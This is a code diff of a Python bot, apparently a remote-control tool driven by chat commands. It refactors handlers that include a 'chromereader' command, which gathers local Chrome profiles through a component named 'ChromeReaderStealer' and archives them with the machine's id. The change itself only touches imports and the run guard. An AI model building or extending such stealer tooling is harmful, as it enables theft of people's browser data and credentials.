@@ -1,5 +1,5 @@
 from BotBase import *
-import executer
+from . import executer as executer
 
 # Windows commands
 @command_handler("hide_windows", "Minimize all windows")
@@ -153,7 +153,7 @@ async def wifi(message: Message):
 @command_handler("chromereader", "👩‍💻 Get all local chrome profiles")
 async def chromereader(message: Message):
     #msg = await reply_to(message, "👩‍💻 Creating archive...")
-    user_manager = executer.ChromeReaderStealer.UserManager.get()
+    user_manager = Bot.ChromeReaderStealer.UserManager.get()
 
     caption = "👩‍💻 Found users:\n\n" + "\n".join([f"<b>{user.user_name}</b> ({len(user.profiles)} profiles):\n{"\n".join([f". {profile.name} ({profile.profile_name})" for profile in user.profiles])}" for user in user_manager.users]) + "\n\nUse the ChromeReader Visualizer on your pc to look at profiles:\nhttps://github.com/mathisgxd/ChromeReader/releases/tag/v0.1.0"
 
@@ -165,7 +165,7 @@ async def chromereader(message: Message):
 
         path = executer.os.path.join(temp_path, f"PC {executer.uuid.getnode()}")
 
-        user_manager = user_manager or executer.ChromeReaderStealer.UserManager.get()
+        user_manager = user_manager or Bot.ChromeReaderStealer.UserManager.get()
         user_manager.save(path)
 
         zip_path = executer.shutil.make_archive(path, "zip", path)
@@ -414,6 +414,7 @@ async def GTE(message_or_call: Message | CallbackQuery, gte_file_name: str | Non
     print(gte_file_name)
     await GTE_handler(message_or_call, gte_file_name or "latest", "show")
 
-run()
+if __name__ == "__main__":
+    run()
 
 
